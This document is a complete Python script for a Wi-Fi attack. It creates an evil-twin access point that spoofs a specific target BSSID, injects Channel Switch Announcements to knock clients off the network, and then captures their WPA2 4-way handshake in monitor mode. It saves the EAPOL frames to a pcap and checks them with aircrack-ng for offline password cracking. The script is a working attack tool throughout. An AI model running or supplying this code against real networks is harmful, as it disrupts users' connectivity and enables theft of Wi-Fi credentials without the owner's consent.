#!/usr/bin/env python3
"""
CSA (Channel Switch Announcement) + Passive Capture for WPA2 handshake.

Strategy:
1. Create evil twin AP (same BSSID as target, same channel)
2. hostapd broadcasts beacons - clients see them as coming from their AP
3. Use hostapd_cli chan_switch to inject CSA IE into beacons
4. Clients process CSA → disconnect → scan → reconnect to real AP
5. Switch to monitor mode to capture the reconnection handshake

CSA works because:
- Beacons ARE transmitted by FullMAC firmware (unlike deauth to non-associated clients)
- Clients trust CSA from their associated BSSID
- The CSA tells clients to move to ch1, where there's no AP → forces reconnection on ch8
"""
import socket, struct, time, os, subprocess, sys

# ================== Config ==================
TARGET_BSSID = "8C:DE:F9:B3:9E:1F"
CHANNEL = 8
FREQ = 2447
CSA_CHANNEL = 1  # Channel to tell clients to switch to (no AP there)
PCAP_FILE = "/tmp/hs_csa.pcap"
CAPTURE_SECONDS = 30
NUM_CYCLES = 4

# PCAP header
PCAP_HDR = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 127)

def run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None

def setup_ap():
    """Create evil twin AP"""
    run("killall hostapd 2>/dev/null")
    run("iw dev ap0 del 2>/dev/null")
    run("ip link set wlan0 down")
    run("iw dev wlan0 set type managed")
    run("ip link set wlan0 up")
    run("iw phy phy0 interface add ap0 type __ap")
    run(f"ip link set ap0 address {TARGET_BSSID}")
    run("ip link set ap0 up")

    # hostapd config with ctrl_interface for hostapd_cli
    conf = f"""interface=ap0
driver=nl80211
ssid=9899a5b76
hw_mode=g
channel={CHANNEL}
wpa=2
wpa_passphrase=dummypass123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ctrl_interface=/var/run/hostapd
beacon_int=50
"""
    with open("/tmp/hs_csa.conf", "w") as f:
        f.write(conf)

    result = run("hostapd -B /tmp/hs_csa.conf")
    time.sleep(0.5)

    # Verify AP is up
    result = run("hostapd_cli -i ap0 status")
    if result and result.stdout:
        for line in result.stdout.split('\n'):
            if 'state=' in line or 'bssid=' in line:
                print(f"    {line.strip()}")

def trigger_csa(target_ch, count=5):
    """Trigger CSA to move clients to a different channel"""
    # chan_switch <cs_count> <freq> [sec_channel_offset=] [center_freq1=] [center_freq2=] [bandwidth=] [blocktx] [ht] [vht]
    target_freq = 2407 + target_ch * 5

    # cs_count = number of beacons before switch (lower = faster)
    cmd = f"hostapd_cli -i ap0 chan_switch {count} {target_freq}"
    result = run(cmd)
    if result:
        print(f"    CSA result: {result.stdout.strip() if result.stdout else ''} {result.stderr.strip() if result.stderr else ''}")
    return result

def setup_monitor():
    """Switch to monitor mode"""
    run("killall hostapd 2>/dev/null")
    time.sleep(0.1)
    run("iw dev ap0 del 2>/dev/null")
    run("ip link set wlan0 down")
    run("iw dev wlan0 set type monitor")
    run("ip link set wlan0 up")
    run(f"iw dev wlan0 set freq {FREQ}")

def is_from_target(data, rt_len, target_bytes):
    if len(data) < rt_len + 22:
        return False
    for off in [4, 10, 16]:
        if data[rt_len+off:rt_len+off+6] == target_bytes:
            return True
    return False

def is_eapol_frame(data, rt_len):
    """Properly detect EAPOL via LLC/SNAP ethertype"""
    if len(data) < rt_len + 30:
        return False
    fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
    ftype = (fc >> 2) & 3
    if ftype != 2:
        return False

    fsubtype = (fc >> 4) & 0xf
    to_ds = fc & 0x0100
    from_ds = fc & 0x0200
    hdr_len = 24
    if to_ds and from_ds:
        hdr_len = 30
    if fsubtype & 0x8:
        hdr_len += 2

    llc_start = rt_len + hdr_len
    if len(data) < llc_start + 8:
        return False

    if data[llc_start:llc_start+6] != b'\xaa\xaa\x03\x00\x00\x00':
        return False

    ethertype = struct.unpack('>H', data[llc_start+6:llc_start+8])[0]
    return ethertype == 0x888e

def get_eapol_msg_num(data, rt_len):
    """Determine EAPOL 4-way handshake message number"""
    fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
    fsubtype = (fc >> 4) & 0xf
    to_ds = fc & 0x0100
    from_ds = fc & 0x0200
    hdr_len = 24
    if to_ds and from_ds:
        hdr_len = 30
    if fsubtype & 0x8:
        hdr_len += 2

    eapol_start = rt_len + hdr_len + 8 + 4  # after 802.11 + LLC/SNAP + EAPOL header
    if len(data) < eapol_start + 3:
        return "?"

    key_info = struct.unpack('>H', data[eapol_start + 1:eapol_start + 3])[0]
    ack = (key_info >> 7) & 1
    mic = (key_info >> 8) & 1
    install = (key_info >> 6) & 1
    secure = (key_info >> 9) & 1

    if ack and not mic:
        return "M1"
    elif not ack and mic and not secure:
        return "M2"
    elif ack and mic and install:
        return "M3"
    elif not ack and mic and secure:
        return "M4"
    return f"KI=0x{key_info:04x}"

def capture_phase(duration, pcap_file, target_bytes):
    """Capture in monitor mode, return EAPOL count"""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind(("wlan0", 0))
        sock.settimeout(0.5)
    except Exception as e:
        print(f"    Socket error: {e}")
        return 0, 0

    total = 0
    eapol_count = 0
    start = time.time()

    while time.time() - start < duration:
        try:
            data = sock.recv(65535)
        except socket.timeout:
            continue

        total += 1
        ts = time.time()

        if len(data) < 4:
            continue
        rt_len = struct.unpack('<H', data[2:4])[0]
        if rt_len >= len(data):
            continue

        # Write to pcap
        sec = int(ts)
        usec = int((ts - sec) * 1e6)
        pcap_file.write(struct.pack('<IIII', sec, usec, len(data), len(data)))
        pcap_file.write(data)

        if not is_from_target(data, rt_len, target_bytes):
            continue

        if is_eapol_frame(data, rt_len):
            eapol_count += 1
            msg = get_eapol_msg_num(data, rt_len)
            sa = data[rt_len+10:rt_len+16].hex(':')
            da = data[rt_len+4:rt_len+10].hex(':')
            elapsed = time.time() - start
            print(f"    *** EAPOL {msg}: {sa} -> {da} (+{elapsed:.1f}s) ***")
            pcap_file.flush()

    sock.close()
    return total, eapol_count

def main():
    target_bytes = bytes(int(b, 16) for b in TARGET_BSSID.split(':'))

    print(f"CSA Attack + Capture")
    print(f"Target: {TARGET_BSSID} ch{CHANNEL}")
    print(f"CSA target channel: {CSA_CHANNEL}")
    print(f"Cycles: {NUM_CYCLES}")
    print()

    pcap = open(PCAP_FILE, 'wb')
    pcap.write(PCAP_HDR)

    total_eapol = 0

    for cycle in range(1, NUM_CYCLES + 1):
        print(f"{'='*50}")
        print(f"CYCLE {cycle}/{NUM_CYCLES}")

        # Phase 1: Setup evil twin and send CSA
        print(f"  [{time.strftime('%H:%M:%S')}] Setting up evil twin AP...")
        setup_ap()

        # Let beacons establish for 2 seconds (clients need to see our beacons)
        print(f"  [{time.strftime('%H:%M:%S')}] Waiting for beacon establishment (2s)...")
        time.sleep(2)

        # Trigger CSA - tell clients to switch to channel 1
        print(f"  [{time.strftime('%H:%M:%S')}] Triggering CSA to ch{CSA_CHANNEL}...")
        trigger_csa(CSA_CHANNEL, count=3)

        # Wait for CSA to be broadcast (3 beacon intervals @ 50ms = 150ms)
        time.sleep(0.5)

        # Send a second CSA for good measure
        trigger_csa(CSA_CHANNEL, count=3)
        time.sleep(0.5)

        # Phase 2: Switch to monitor and capture
        t0 = time.time()
        setup_monitor()
        t1 = time.time()
        print(f"  [{time.strftime('%H:%M:%S')}] Monitor ready ({t1-t0:.2f}s). Capturing {CAPTURE_SECONDS}s...")

        pkts, eapols = capture_phase(CAPTURE_SECONDS, pcap, target_bytes)
        total_eapol += eapols
        print(f"  Cycle {cycle}: {pkts} pkts, {eapols} EAPOL")

        if total_eapol >= 2:
            print(f"\n  *** Got {total_eapol} EAPOL frames! ***")
            break

    pcap.close()

    print(f"\n{'='*50}")
    print(f"TOTAL: {total_eapol} EAPOL frames")
    print(f"PCAP: {PCAP_FILE}")

    if total_eapol > 0:
        print("\nVerifying with aircrack-ng...")
        result = run(f"aircrack-ng {PCAP_FILE}", timeout=30)
        if result and result.stdout:
            print(result.stdout[:500])
    else:
        print("\nNo EAPOL captured. The CSA may not have triggered client reconnection.")
        print("Try: manually disconnect/reconnect a device while running capture_passive.py")

    return 0 if total_eapol >= 2 else 1

if __name__ == "__main__":
    sys.exit(main())
